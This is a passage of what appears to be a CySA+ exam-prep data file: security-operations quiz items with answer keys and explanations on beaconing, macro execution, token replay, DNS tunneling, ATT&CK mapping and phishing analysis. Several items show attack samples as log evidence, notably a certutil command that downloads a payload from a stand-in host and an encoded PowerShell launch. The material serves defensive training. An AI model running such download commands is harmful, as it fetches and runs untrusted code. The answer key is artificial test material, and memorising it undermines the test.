"MFA fatigue = repeated push prompts hoping for accidental approval. Token replay = reusing a stolen valid session with no prompt at all. Different attacks, different fixes." ],
video: { title: "CompTIA CySA+ (CS0-004) Domain 1: Security Operations", url: "https://www.youtube.com/watch?v=gyE8di5QPfQ", note: "This full-domain walkthrough also covers email, web, and identity threat analysis." },
},
},
mcq: {
"cysa-ops-1": [
{ s: "Night shift at Fleet Ops. A finance workstation's proxy log is pulled for review.", e: "09:00:04 GET sync-cdn[.]net/a 402B\n09:05:04 GET sync-cdn[.]net/a 402B\n09:10:05 GET sync-cdn[.]net/a 403B\n09:11:20 GET news.site.com 91KB", q: "Which observation most strongly indicates command-and-control activity?", options: [
 { t: "Fixed 5-minute intervals with near-identical byte sizes to one domain", c: true, w: "Timer-driven, uniform check-ins are the beaconing signature; humans browse in variable bursts." },
 { t: "The 91KB transfer to news.site.com", c: false, w: "A single normal-sized page load is ordinary browsing -- size alone isn't an indicator." },
 { t: "Use of GET requests instead of POST", c: false, w: "HTTP method choice is not an indicator; both are used constantly by benign traffic." },
 { t: "Any traffic occurring before business hours", c: false, w: "09:00 isn't off-hours, and time alone without a baseline proves nothing." } ] },
{ s: "EDR flags a process on a laptop in the hangar bay.", e: "WINWORD.EXE -> powershell.exe -enc JABz...\nDoc opened from email 3 min prior: invoice_Q3.docm", q: "What does this parent-child relationship most likely indicate?", options: [
 { t: "A malicious macro executed code -- a likely initial access event", c: true, w: "Office spawning encoded PowerShell right after a .docm email attachment is the textbook macro chain." },
 { t: "Normal Office behavior when updating add-ins", c: false, w: "Office updates don't launch encoded PowerShell; this lineage is never routine." },
 { t: "An IT admin running maintenance scripts", c: false, w: "Admin tooling runs from management agents (SCCM/Intune), not from inside Word." },
 { t: "Evidence of data exfiltration in progress", c: false, w: "Nothing shows data leaving -- this is execution/initial access, not exfil. Don't skip ahead of evidence." } ] },
{ s: "An analyst reviews Entra sign-in logs after a phishing wave.", e: "j.rivera: Dallas 08:58 [MFA OK]\nj.rivera: overseas IP 09:36 'MFA previously satisfied'", q: "What is the most likely explanation?", options: [
 { t: "Session token theft and replay -- the attacker reused a valid token", c: true, w: "Impossible travel plus 'previously satisfied' MFA means the session, not the password, was stolen." },
 { t: "The user's password was cracked by brute force", c: false, w: "A cracked password would trigger a fresh MFA challenge, not token reuse." },
 { t: "A benign VPN exit-node change", c: false, w: "Possible in general, but paired with a phishing wave and token reuse, the malicious explanation dominates; verify, don't dismiss." },
 { t: "Clock skew between logging systems", c: false, w: "Skew shuffles timestamps slightly; it doesn't fabricate a second country and a token-reuse artifact." } ] },
{ s: "SOC review of yesterday's authentications.", e: "1 source IP -> 84 different accounts\n1-2 failed attempts each | result code: bad password\n2 accounts: success on first try", q: "This pattern is best classified as:", options: [
 { t: "Password spraying, with two likely compromised accounts", c: true, w: "Many accounts, few attempts each, one source = spray; the successes are your incident." },
 { t: "Brute force against a single account", c: false, w: "Brute force is many attempts against few accounts -- the inverse of this distribution." },
 { t: "Normal helpdesk password-reset activity", c: false, w: "Helpdesk activity doesn't originate 84 accounts' attempts from one external IP." },
 { t: "MFA fatigue attack", c: false, w: "Fatigue attacks bombard one user with push prompts after credential theft -- different signature." } ] },
{ s: "A DNS log review on a quiet subnet.", e: "4,812 queries in 1h from HOST-DEV-3:\n aGVsbG8x.k2.datapipe[.]io\n dGVzdDEy.k2.datapipe[.]io\n (unique subdomain every query)", q: "What activity does this most likely represent?", options: [
 { t: "DNS tunneling -- data encoded into subdomains", c: true, w: "Thousands of unique, high-entropy subdomains to one domain is data moving through port 53." },
 { t: "A misconfigured DNS resolver looping", c: false, w: "Loops repeat the same query; these are unique encoded labels each time." },
 { t: "Normal CDN behavior", c: false, w: "CDNs use a modest set of stable hostnames, not one-time random labels at this volume." },
 { t: "A DGA-based malware finding its C2", c: false, w: "DGA rotates the registered domain; here the domain is constant and the subdomain carries payload -- that's tunneling." } ] },
{ s: "Cloud audit log triage after an access review.", e: "principal: svc-backup-old | action: ListBuckets, GetObject x400\nsourceIP: residential ISP | time: 02:30 | last legit use: 8 months ago", q: "Which element makes this MOST suspicious?", options: [
 { t: "A dormant service identity suddenly enumerating and reading storage from a residential IP", c: true, w: "Stale credentials awakening to enumerate data from unexpected infrastructure is a classic compromised-credential pattern." },
 { t: "The use of GetObject, which is inherently dangerous", c: false, w: "GetObject is routine; the actor, source, and dormancy make it hostile, not the API name." },
 { t: "The 02:30 timestamp alone", c: false, w: "Backups legitimately run overnight -- time only matters combined with the other anomalies." },
 { t: "Use of a service account instead of a user account", c: false, w: "Service accounts are normal; unexplained revival of an unused one is the issue." } ] },
{ s: "You must scope a confirmed C2 domain across the fleet quickly.", e: "Confirmed IoC: cdn-sync[.]io\nAvailable: 90 days NetFlow, 48h rolling PCAP, EDR, proxy logs", q: "What is the BEST first pivot?", options: [
 { t: "Query proxy/flow data for all hosts contacting the domain over the retention window", c: true, w: "Scoping = who else talked to it; flow/proxy data answers that across months in one query." },
 { t: "Open the 48h PCAP and read payloads", c: false, w: "PCAP proves content, but 48h can't scope a possibly weeks-old intrusion -- and it's the slow tool." },
 { t: "Reimage the first infected host, then look around", c: false, w: "Acting before scoping destroys evidence and leaves the other infected hosts running." },
 { t: "Block the domain and consider the incident scoped", c: false, w: "Blocking is containment, not scoping; you still don't know who was infected." } ] },
{ s: "An analyst claims a host is clean because antivirus found no malicious files on disk.", e: "EDR: powershell.exe holding open C2 connection\nDisk scan: no malicious binaries found", q: "What explains the contradiction?", options: [
 { t: "Fileless malware executing in memory -- disk scans can't see it", c: true, w: "Payloads injected into legitimate processes leave no file for AV; memory/EDR telemetry is where they exist." },
 { t: "The EDR alert must be a false positive", c: false, w: "An observed live C2 connection outweighs a negative disk scan; absence of files isn't absence of malware." },
 { t: "The antivirus signatures are simply outdated", c: false, w: "Even current signatures can't scan what never touches disk -- the gap is architectural, not a version issue." },
 { t: "PowerShell itself is the malware and should be deleted", c: false, w: "PowerShell is a signed OS component being abused; the payload lives in its memory space." } ] } ],

"cysa-ops-2": [
{ s: "An implant checks in to its operator over HTTPS every 10 minutes.", e: "Behavior: periodic HTTPS check-ins blending with web traffic", q: "Map this to MITRE ATT&CK:", options: [
 { t: "Command and Control -- T1071.001 Web Protocols", c: true, w: "C2 over standard web protocols to blend in is exactly T1071.001 under the C2 tactic." },
 { t: "Exfiltration -- T1048", c: false, w: "No data-theft evidence exists; heartbeats are check-ins, not exfil." },
 { t: "Persistence -- T1547", c: false, w: "Persistence is how the implant survives reboots -- a different question than how it communicates." },
 { t: "Initial Access -- T1566 Phishing", c: false, w: "That's how it may have arrived; the observed behavior now is communication." } ] },
{ s: "A ransomware crew encrypts a hospital's file servers and demands payment.", e: "Files encrypted, ransom note dropped", q: "The encryption itself maps to which tactic/technique?", options: [
 { t: "Impact -- T1486 Data Encrypted for Impact", c: true, w: "Destroying availability for extortion is the Impact tactic; T1486 is its signature technique." },
 { t: "Defense Evasion -- T1027 Obfuscation", c: false, w: "Obfuscation hides the attacker's code, not the victim's data." },
 { t: "Collection -- T1005 Data from Local System", c: false, w: "Collection gathers data for theft; this encrypts in place to break the business." },
 { t: "Credential Access -- T1003", c: false, w: "No credential theft is described in the encryption act itself." } ] },
{ s: "Your CISO asks which detection investment hurts attackers the most long-term.", e: "Pyramid of Pain: hashes < IPs < domains < artifacts < tools < TTPs", q: "Per the Pyramid of Pain, prioritize detections for:", options: [
 { t: "Behaviors/TTPs, such as Office spawning script interpreters", c: true, w: "TTPs are the most expensive thing for attackers to change -- behavioral detections survive infrastructure rotation." },
 { t: "The file hashes from last month's incident", c: false, w: "Hashes are trivially changed by recompiling; bottom of the pyramid." },
 { t: "The attacker's current IP addresses", c: false, w: "IPs rotate in minutes on rented infrastructure." },
 { t: "The attacker's current domain names", c: false, w: "Better than IPs, still cheap to replace; behavior beats infrastructure." } ] },
{ s: "Two intel reports land on your desk during an active campaign against your sector.", e: "Report A: 500 IP indicators, 6 weeks old, unknown source\nReport B: verified vendor analysis of actor TTPs targeting your industry, this week", q: "Which report is more valuable and why?", options: [
 { t: "B -- fresh, reliable, relevant TTP intelligence enables durable detections", c: true, w: "Value = reliability x relevance x freshness; TTPs also outlast the stale IPs in A." },
 { t: "A -- 500 indicators offer more coverage than one report", c: false, w: "Volume of expired, unattributed IoCs is noise, not coverage." },
 { t: "A -- technical indicators are always superior to narrative analysis", c: false, w: "Technical IoCs have the shortest shelf life on the pyramid; six weeks is ancient." },
 { t: "Both equal -- all intelligence should be loaded into the SIEM", c: false, w: "Loading stale indiscriminate IoCs generates false positives and dilutes analyst trust." } ] },
{ s: "You want to hunt for scheduled-task persistence (T1053).", e: "Available: EDR process events, Windows event logs, deployment calendar", q: "What does a hypothesis-driven hunt look like here?", options: [
 { t: "\"If T1053 is present, schtasks.exe creations will appear outside deployment windows\" -- then query and compare", c: true, w: "A falsifiable hypothesis tied to a data source and expected evidence is the definition of structured hunting." },
 { t: "Scroll recent EDR alerts and see what looks weird", c: false, w: "Alert review is triage, not hunting -- hunting looks for what didn't alert." },
 { t: "Search all logs for the string 'T1053'", c: false, w: "ATT&CK IDs are analyst labels; they don't appear in telemetry." },
 { t: "Wait for threat intel to publish task names to search for", c: false, w: "Hunting is proactive; waiting for IoCs is the opposite of the exercise." } ] },
{ s: "A hunt for anomalous service creations finds nothing malicious.", e: "Hunt result: no true positives; query validated against a red-team dataset", q: "What is the correct disposition of this hunt?", options: [
 { t: "Document coverage confidence and promote the validated query into a scheduled detection", c: true, w: "A clean, validated hunt still produces value: assurance plus a new permanent detection." },
 { t: "Record it as wasted effort and pick a new topic", c: false, w: "Hunts that find nothing but validate detection capability are successes, not waste." },
 { t: "Rerun the same hunt daily by hand until it finds something", c: false, w: "That's what scheduled analytics are for -- automate the validated logic." },
 { t: "Lower the query's thresholds until it returns hits", c: false, w: "Manufacturing findings creates false positives; hunts must not be tuned toward noise." } ] },
{ s: "An observed intrusion: phish -> macro -> credential dump -> RDP to a second host.", e: "Sequence spans multiple behaviors", q: "The RDP movement to a second host maps to which tactic?", options: [
 { t: "Lateral Movement", c: true, w: "Using valid sessions/protocols to reach additional systems is the Lateral Movement tactic (e.g., T1021.001 RDP)." },
 { t: "Privilege Escalation", c: false, w: "Escalation raises rights on a system; moving between systems is lateral movement." },
 { t: "Discovery", c: false, w: "Discovery is learning the environment; the hop itself is movement." },
 { t: "Initial Access", c: false, w: "Initial access already happened via the phish -- first entry only counts once." } ] },
{ s: "A junior analyst wants to attribute an intrusion to a named nation-state group based on one tool match.", e: "Evidence: one publicly available tool also used by many actors", q: "What's the right guidance?", options: [
 { t: "Attribution needs corroborated evidence across TTPs and infrastructure; shared public tooling alone proves little", c: true, w: "Commodity tools are used by everyone; responsible attribution is evidence-weighted and usually out of scope for the SOC's response decisions anyway." },
 { t: "Publish the attribution -- speed matters more than certainty", c: false, w: "Wrong public attribution damages credibility and can misdirect response." },
 { t: "Attribution is impossible, so never discuss actors", c: false, w: "Overcorrection -- actor intelligence informs defense; it just requires evidence discipline." },
 { t: "Match the tool's hash against ATT&CK to confirm the actor", c: false, w: "ATT&CK catalogs behaviors, not a hash-to-actor oracle." } ] } ],

"cysa-ops-3": [
{ s: "Leadership asks which hosts communicated with a confirmed hostile IP over the past 60 days.", e: "Available: NetFlow (90d), PCAP (48h rolling), proxy (30d)", q: "Best data source for this question:", options: [
 { t: "NetFlow -- long-retention who-talked-to-whom records", c: true, w: "Flow data exists precisely for cheap, long-horizon scoping of communications." },
 { t: "PCAP -- the most detailed source available", c: false, w: "Detail you don't need with retention that can't cover the window." },
 { t: "Endpoint AV scan results", c: false, w: "AV verdicts say nothing about network communications history." },
 { t: "Firewall configuration backups", c: false, w: "Configs show policy, not observed traffic." } ] },
{ s: "You must prove exactly what data was submitted in a suspicious HTTP POST yesterday.", e: "The transaction occurred 20 hours ago on a monitored segment", q: "Which source can answer definitively?", options: [
 { t: "Full packet capture from that segment", c: true, w: "Only PCAP preserves payload content; flows and proxies summarize but don't retain bodies." },
 { t: "NetFlow records of the session", c: false, w: "Flow tells you bytes and endpoints, never the content." },
 { t: "The user's recollection of what they uploaded", c: false, w: "Human memory isn't forensic evidence." },
 { t: "DNS logs for the destination domain", c: false, w: "DNS shows resolution, not payload." } ] },
{ s: "Zeek conn.log review on a workstation VLAN.", e: "host 10.2.4.19 -> 10.2.4.0/24: SYN to ports 445,3389,22,80 on 254 hosts in 3 min", q: "This pattern indicates:", options: [
 { t: "Internal network scanning -- likely Discovery/lateral movement staging", c: true, w: "One host sweeping the subnet across admin ports is enumeration, mapping to Discovery (T1046)." },
 { t: "Normal SMB file-sharing behavior", c: false, w: "File sharing connects to a few servers, not every host on four ports." },
 { t: "A DDoS attack against the workstation", c: false, w: "Direction is outbound from the host -- it's the scanner, not the target." },
 { t: "Vulnerability scanner activity, therefore always benign", c: false, w: "Could be a sanctioned scanner -- but that's verified by asset identity, not assumed; a workstation doing this is hostile until proven otherwise." } ] },
{ s: "A malware payload allegedly runs only in memory. The IR lead sequences evidence collection.", e: "Host is live; decision: what to capture first", q: "Correct order per order-of-volatility:", options: [
 { t: "Memory image first, then disk image, then logs already persisted", c: true, w: "Volatile data disappears at power-off; capture RAM before anything that survives on disk." },
 { t: "Disk image first since it's the largest", c: false, w: "Size doesn't set order -- volatility does; the in-memory payload dies while you image the disk." },
 { t: "Power the host off immediately to freeze all evidence", c: false, w: "Power-off destroys exactly the volatile evidence this case depends on." },
 { t: "Logs first because they're easiest", c: false, w: "Persisted logs aren't going anywhere; RAM is." } ] },
{ s: "Your Suricata sensors went quiet on payload signatures after the org moved to TLS-everywhere.", e: "Traffic now >95% encrypted at the monitored point", q: "What remains detectable WITHOUT decryption?", options: [
 { t: "Connection metadata: destinations, timing/beacon patterns, JA3-style fingerprints, SNI, volumes", c: true, w: "Encryption hides payloads, not behavior -- beaconing, rare destinations, and TLS fingerprints still work." },
 { t: "Nothing -- encrypted traffic cannot be monitored", c: false, w: "Metadata analysis is a core encrypted-era skill; giving up is wrong and exam-wrong." },
 { t: "Payload signatures still match inside TLS", c: false, w: "By definition, content signatures can't read ciphertext." },
 { t: "Only DNS remains useful", c: false, w: "DNS helps, but flow metadata and TLS fingerprints are equally alive." } ] },
{ s: "EDR shows a suspicious chain on a maintenance server.", e: "services.exe -> cmd.exe -> certutil.exe -urlcache -f http://x.io/p.bin", q: "Why is this chain alarming?", options: [
 { t: "A LOLBin (certutil) is being used as a downloader from an unusual parent chain", c: true, w: "certutil's URL-fetch abuse is classic living-off-the-land; services.exe->cmd is not routine lineage." },
 { t: "certutil.exe is unsigned malware", c: false, w: "It's a signed Windows binary -- that's exactly why attackers use it." },
 { t: "cmd.exe running on a server is itself an incident", c: false, w: "Shells run legitimately constantly; arguments and lineage make this case." },
 { t: "HTTP instead of HTTPS is the core issue", c: false, w: "The downloader behavior is the issue, whatever the scheme." } ] },
{ s: "Analysts debate sensor placement for a new IDS.", e: "Option A: outside the firewall | Option B: inside, behind NAT", q: "Key tradeoff to communicate:", options: [
 { t: "Outside sees all internet noise pre-filter; inside sees real internal addresses and what actually got through", c: true, w: "Placement defines visibility: external = raw threat weather; internal = actionable, attributed events. Many orgs deploy both." },
 { t: "Placement doesn't matter for detection", c: false, w: "It changes what addresses and which traffic you can even see." },
 { t: "Inside placement is wrong because NAT breaks IDS", c: false, w: "Inside placement is precisely how you preserve true internal IPs." },
 { t: "Outside placement removes the need for tuning", c: false, w: "Outside placement multiplies noise -- tuning matters more, not less." } ] },
{ s: "A DGA-infected host and a DNS-tunneling host both appear in today's queue.", e: "Host A: thousands of random *registered-domain* lookups, most NXDOMAIN\nHost B: thousands of random *subdomains* under one registered domain", q: "Correctly distinguish them:", options: [
 { t: "A = DGA (malware seeking its C2 domain); B = DNS tunneling (data in subdomains)", c: true, w: "DGA rotates the registered domain hunting for a live one (mass NXDOMAIN); tunneling keeps one domain and encodes data in labels." },
 { t: "Both are DGA variants", c: false, w: "The constant registered domain with payload subdomains is tunneling, not domain generation." },
 { t: "Both are tunneling", c: false, w: "Mass NXDOMAIN across many registered domains is the DGA fingerprint." },
 { t: "A is benign CDN, B is DGA", c: false, w: "Reversed and wrong -- high NXDOMAIN randomness is not CDN behavior." } ] } ],

"cysa-ops-4": [
{ s: "A new EDR rule for 'encoded PowerShell' fires 400 times overnight.", e: "398x: parent SCCM_Agent.exe, signed script, path C:\\ProgramData\\SCCM\\\n2x: parent WINWORD.EXE, path C:\\Users\\...\\AppData\\Temp\\", q: "Best tuning action?", options: [
 { t: "Write a narrow exception (parent=SCCM_Agent AND known hash AND expected path) and investigate the two Word-spawned events", c: true, w: "Compound, narrow exceptions kill the noise while keeping coverage -- and the two outliers are your real alerts." },
 { t: "Disable the rule; it's clearly too noisy", c: false, w: "The rule just caught two probable intrusions. Disabling trades a real detection for quiet." },
 { t: "Raise the alert threshold to 10 events per host", c: false, w: "Real attacks fire once or twice; thresholds hide exactly the events you need." },
 { t: "Exclude everything running from C:\\ProgramData", c: false, w: "A broad path exclusion is a gift to attackers, who routinely stage in ProgramData." } ] },
{ s: "During an incident timeline reconstruction, events appear to happen in impossible order across two servers.", e: "SRV-A: attack step logged 03:12:44\nSRV-B: prerequisite step logged 03:14:02", q: "Most likely explanation to check FIRST:", options: [
 { t: "Clock drift -- verify both servers sync to NTP", c: true, w: "Unsynchronized clocks are the classic cause of impossible timelines; verify time sources before exotic theories." },
 { t: "The attacker time-traveled the logs", c: false, w: "Log tampering is possible but NTP drift is far more common and checked first." },
 { t: "The SIEM database is corrupted", c: false, w: "Possible but rare; time sync is the standard first check." },
 { t: "The events are unrelated", c: false, w: "They're causally linked steps of the same intrusion; sequencing is the issue." } ] },
{ s: "A SOC drowns in alerts; leadership will fund exactly one improvement.", e: "Current: no SOAR, alert-to-incident ratio 900:1, MTTD 6 days", q: "Highest-impact investment for triage load?", options: [
 { t: "SOAR automation for enrichment and de-duplication of the alert queue", c: true, w: "SOAR attacks the 900:1 ratio directly by auto-enriching, correlating, and closing known-benign patterns before humans see them." },
 { t: "A second SIEM for redundancy", c: false, w: "Duplicate SIEMs duplicate the alert flood." },
 { t: "Longer log retention", c: false, w: "Retention helps forensics, not daily triage load." },
 { t: "More detection rules", c: false, w: "More rules without tuning/automation worsens the ratio." } ] },
{ s: "After tuning a detection rule, the engineer must validate the change.", e: "Change: added exception for backup-agent activity", q: "Correct validation step:", options: [
 { t: "Replay known-true-positive attack data and confirm the rule still fires", c: true, w: "Tuning is only safe if proven against known-bad; passive waiting can't distinguish 'quiet' from 'blind.'" },
 { t: "Wait a week and see if analysts complain", c: false, w: "Silence could mean the rule is now blind -- you can't tell without testing." },
 { t: "Confirm the alert count dropped", c: false, w: "Count dropping is the goal AND the failure mode; it proves nothing alone." },
 { t: "Ask the backup vendor if the exception looks right", c: false, w: "Vendors don't know your detection coverage; test with data." } ] },
{ s: "An ML-based anomaly detector flags a service account at 3 a.m.; a scheduled job explains it. Weeks later the model stops flagging a genuinely new attack pattern.", e: "Model retrains continuously on live traffic", q: "What likely happened?", options: [
 { t: "Model drift/normalization -- continuous retraining absorbed the attacker's behavior into 'normal'", c: true, w: "Slow-roll attackers poison baselines; continuously self-training models normalize persistent malicious behavior. Guard with holdout validation and human review." },
 { t: "The model ran out of storage", c: false, w: "Capacity issues throw errors; they don't selectively unlearn attacks." },
 { t: "ML models cannot detect network attacks", c: false, w: "They can -- the failure mode here is baseline poisoning, not incapability." },
 { t: "The SIEM license expired", c: false, w: "Licensing failures are loud and total, not selective." } ] },
{ s: "AI-assisted triage summarizes an incident: 'Host X beaconed to evil.com, user clicked phish at 09:14.'", e: "Underlying logs: beacon confirmed; no email click event exists anywhere", q: "Correct handling of the AI summary?", options: [
 { t: "Use the verified beacon finding; discard the click claim as a hallucination and note the validation gap", c: true, w: "AI outputs are leads, not evidence -- every claim must trace to a log line. Partial hallucination is the standard failure mode." },
 { t: "Trust the summary; AI has better recall than analysts", c: false, w: "The click event doesn't exist -- asserting it in the record fabricates evidence." },
 { t: "Discard the entire summary including the beacon", c: false, w: "The beacon is independently verified; discard only what fails validation." },
 { t: "Ask the AI to confirm its own claim", c: false, w: "Self-confirmation isn't validation; check the logs." } ] },
{ s: "A correlation rule idea: flag when 10+ failed logins from one IP are followed by a success within 5 minutes.", e: "Sources needed: auth logs across VPN, Entra, and Windows", q: "What architectural prerequisite makes this rule reliable?", options: [
 { t: "All auth sources onboarded with synchronized timestamps and normalized fields", c: true, w: "Cross-source correlation lives or dies on complete ingestion, common time, and consistent field parsing." },
 { t: "A machine-learning model to score each login", c: false, w: "This is a deterministic pattern -- ML adds nothing but complexity here." },
 { t: "Full packet capture of authentication traffic", c: false, w: "Auth events come from logs; PCAP is the wrong (and heavy) layer." },
 { t: "An EDR agent on the firewall", c: false, w: "That's not a thing -- EDR is for endpoints; firewalls export logs." } ] },
{ s: "Metrics review: MTTD fell from 6 days to 8 hours after new analytics, but false positives doubled.", e: "Leadership asks: net win or loss?", q: "Best analytical framing:", options: [
 { t: "Likely a win -- detection speed improved massively; now iterate tuning to bring FP rate down without losing the new coverage", c: true, w: "MTTD is the outcome metric; FP volume is a tunable cost. The move is targeted tuning, not rollback." },
 { t: "Loss -- false positives are the only metric that matters", c: false, w: "A quiet SOC that detects in 6 days is losing; noise is workable, blindness isn't." },
 { t: "Roll back the analytics until FPs return to baseline", c: false, w: "Rollback surrenders the 18x detection improvement." },
 { t: "Metrics can't evaluate SOC changes", c: false, w: "This is exactly what MTTD/FP-rate trending is for." } ] } ],

"cysa-ops-5": [
{ s: "A phish lands in inboxes spoofing your exact domain.", e: "Authentication-Results: spf=fail dkim=none dmarc=fail action=none", q: "Why was it delivered?", options: [
 { t: "DMARC policy is p=none -- monitor-only, so receivers deliver despite failures", c: true, w: "p=none collects reports but instructs no enforcement; quarantine/reject is what blocks spoofing." },
 { t: "SPF passed, overriding DMARC", c: false, w: "The header literally shows spf=fail." },
 { t: "DKIM signatures don't apply to spoofed mail", c: false, w: "dkim=none is part of the failure; the delivery decision came from the none policy." },
 { t: "The receiving server was misconfigured", c: false, w: "It honored the published policy correctly -- the policy is the gap." } ] },
{ s: "Header review of a suspicious 'CEO' email.", e: "From: CEO <ceo@company.com>\nReturn-Path: <bounce@quick-pay-portal.xyz>\nReply-To: ceo@cornpany-payments.com", q: "Strongest indicator of phishing here:", options: [
 { t: "Mismatch between display From, Return-Path, and a lookalike Reply-To domain (rn->m)", c: true, w: "Envelope/display divergence plus a homoglyph reply-to is the classic BEC construction." },
 { t: "The email mentions payments", c: false, w: "Topic alone isn't an indicator; executives discuss payments legitimately." },
 { t: "The From address uses the real domain", c: false, w: "That's the spoof working, not the tell -- the surrounding fields expose it." },
 { t: "It was sent on a Friday", c: false, w: "Timing is social-engineering seasoning, not evidence." } ] },
{ s: "A user reports an attachment: 'invoice.iso' from an unknown sender.", e: "ISO contains invoice.lnk -> powershell download command", q: "Why do attackers package payloads in ISO/LNK like this?", options: [
 { t: "Container formats historically sidestep mark-of-the-web, dodging macro blocks and warning prompts", c: true, w: "After macro-blocking, attackers moved to ISO/LNK/OneNote chains precisely to evade MOTW-based protections." },
 { t: "ISO files are smaller than documents", c: false, w: "Size is irrelevant; evasion is the point." },
 { t: "ISOs can't be scanned by any antivirus", c: false, w: "They can be scanned; the advantage was the MOTW gap, not invisibility." },
 { t: "LNK files run only on servers", c: false, w: "Shortcuts run anywhere Windows does." } ] },
{ s: "Post-phish, a user's account shows a new sign-in that passed MFA via number matching from the user, then a session from an unknown device.", e: "AiTM kit confirmed on the phishing page", q: "First remediation action:", options: [
 { t: "Revoke all sessions/refresh tokens for the account, then reset credentials", c: true, w: "The attacker holds a live token; revocation evicts them -- a reset alone does not." },
 { t: "Reset the password only", c: false, w: "The stolen session outlives the old password." },
 { t: "Send the user security awareness training immediately", c: false, w: "Training is post-incident hygiene, not containment." },
 { t: "Block the phishing domain and stop there", c: false, w: "Stops future victims; does nothing for the active stolen session." } ] },
{ s: "Leadership asks how to make phishing-based session theft structurally harder.", e: "Current MFA: push notifications with number matching", q: "Best control upgrade:", options: [
 { t: "Phishing-resistant MFA (FIDO2 security keys / passkeys) for high-risk users first", c: true, w: "FIDO2 binds authentication to the legitimate origin, so AiTM proxy pages can't harvest a usable credential." },
 { t: "Increase push prompts to twice per login", c: false, w: "More prompts of a phishable factor doesn't change its phishability -- and breeds fatigue." },
 { t: "Longer passwords rotated monthly", c: false, w: "AiTM captures whatever password exists; rotation is irrelevant mid-theft." },
 { t: "Block all personal email domains", c: false, w: "Marginal at best; the attack uses lookalike and compromised domains too." } ] },
{ s: "URL triage on a reported email.", e: "Display text: https://portal.company.com/login\nActual href: https://company-com.portal-auth.xyz/login", q: "What is the deception technique?", options: [
 { t: "Hyperlink text mismatch pointing to a lookalike domain where the real brand is a subdomain of an attacker domain", c: true, w: "The registrable domain is portal-auth.xyz; 'company-com' is set dressing. Always read right-to-left from the TLD." },
 { t: "An open redirect on the legitimate portal", c: false, w: "No redirect involved -- the href never touches the real domain." },
 { t: "Homoglyph substitution in the TLD", c: false, w: "No character tricks here; it's a subdomain illusion." },
 { t: "URL shortener obfuscation", c: false, w: "The URL is fully visible, just deceptive." } ] },
{ s: "Sandbox detonation of a reported attachment shows nothing; the analyst wants to clear it.", e: "Sample: macro doc | sandbox ran 60s, default profile\nIntel: this family checks for sandbox artifacts and sleeps 10 min", q: "Correct interpretation:", options: [
 { t: "A clean sandbox run is not proof of safety -- evasive samples detect analysis or delay; extend runtime/use hardened profiles and corroborate with static review", c: true, w: "Sandbox evasion (sleep timers, environment checks) is standard; negative dynamic results need corroboration." },
 { t: "Sandbox verdicts are definitive; release the file", c: false, w: "Evasion is designed to produce exactly this false confidence." },
 { t: "Sandboxes only work on executables, not documents", c: false, w: "Document detonation is a primary sandbox use case." },
 { t: "Detonate it on the analyst workstation to be sure", c: false, w: "Never detonate on production endpoints -- that's the incident you were preventing." } ] },
{ s: "Comparing two suspicious login patterns after a phishing campaign.", e: "User A: 40 push prompts in 20 min, then approval at 02:10\nUser B: single login, new country, 'MFA previously satisfied'", q: "Classify each:", options: [
 { t: "A = MFA fatigue (bombing) success; B = stolen session token replay", c: true, w: "Prompt-bombing wears the user down into approving; token replay skips the challenge entirely -- different attacks, different fixes." },
 { t: "Both are MFA fatigue", c: false, w: "B never generated prompts -- the session was already 'satisfied.'" },
 { t: "Both are token theft", c: false, w: "A shows a live challenge flood, which token replay wouldn't produce." },
 { t: "A is benign; users often get 40 prompts", c: false, w: "A 2 a.m. prompt flood ending in approval is a textbook compromise." } ] } ],
},
pbqs: [
{ type: "order", s: "A confirmed beaconing host must be worked methodically.", task: "Arrange the analyst workflow in the correct order:",
 steps: ["Validate the alert against raw proxy/EDR telemetry", "Scope the indicator across all hosts and log sources", "Capture volatile evidence from affected hosts", "Contain (isolate hosts, block the domain)", "Eradicate the implant and close the entry vector", "Brief stakeholders with evidence-backed findings"],
 x: "Validate before you scope, scope before you act, preserve before you contain, contain before eradication, and report from evidence. Acting before scoping tips the attacker and misses hosts." },
{ type: "order", s: "A phishing report arrives claiming a credential-harvesting link was clicked.", task: "Order the email-incident triage steps:",
 steps: ["Analyze headers and URL to confirm malicious intent", "Search the mail system for all recipients of the campaign", "Purge/quarantine the message org-wide", "Revoke sessions and reset credentials for confirmed clickers", "Block the sender infrastructure and add detections", "Document the campaign and update user guidance"],
 x: "Confirm first (false reports are common), then scope recipients, remove the lure, remediate compromised identities, then harden and document." },
{ type: "match", s: "Map each observed behavior to its MITRE ATT&CK tactic.", task: "Assign every behavior:",
 cats: ["Command and Control", "Lateral Movement", "Credential Access", "Exfiltration"],
 items: [
  { t: "Periodic HTTPS check-ins to a young domain", c: "Command and Control" },
  { t: "LSASS memory dumped by an unusual process", c: "Credential Access" },
  { t: "RDP session from a workstation to three servers using a service account", c: "Lateral Movement" },
  { t: "700MB archive uploaded to an unknown cloud storage host at 03:00", c: "Exfiltration" },
  { t: "Kerberoasting: mass service-ticket requests from one user", c: "Credential Access" },
  { t: "DNS TXT queries carrying encoded payload chunks outbound", c: "Exfiltration" } ],
 x: "Check-ins = C2; credential material harvesting (LSASS, Kerberoasting) = Credential Access; moving between systems = Lateral Movement; data leaving = Exfiltration." },
{ type: "match", s: "Classify each log observation by what it most likely indicates.", task: "Match observation to classification:",
 cats: ["Likely malicious", "Likely benign", "Needs baseline context"],
 items: [
  { t: "WINWORD.EXE spawning encoded powershell.exe", c: "Likely malicious" },
  { t: "SCCM_Agent.exe running signed scripts from its install path", c: "Likely benign" },
  { t: "A 2GB upload to an unrecognized IP from a workstation", c: "Needs baseline context" },
  { t: "One source IP failing logins across 80 accounts", c: "Likely malicious" },
  { t: "Server rebooting during the documented patch window", c: "Likely benign" },
  { t: "Admin logon at 03:00", c: "Needs baseline context" } ],
 x: "Some patterns are near-certain (macro chains, sprays); some are near-certainly fine (signed management tooling in place); volume and timing anomalies mean nothing without a baseline." },
{ type: "match", s: "Choose the right telemetry source for each investigative question.", task: "Match question to best source:",
 cats: ["NetFlow", "Full PCAP", "EDR process telemetry", "DNS logs"],
 items: [
  { t: "Which hosts contacted 185.220.10.5 in the last 60 days?", c: "NetFlow" },
  { t: "What exact payload was POSTed to the attacker server?", c: "Full PCAP" },
  { t: "What parent process launched the suspicious binary and with what arguments?", c: "EDR process telemetry" },
  { t: "Is any host resolving algorithmically generated domains?", c: "DNS logs" },
  { t: "How many bytes left the network to that IP each day?", c: "NetFlow" } ],
 x: "Flow = scope and volume over time; PCAP = exact content; EDR = host lineage and arguments; DNS = resolution behavior." },
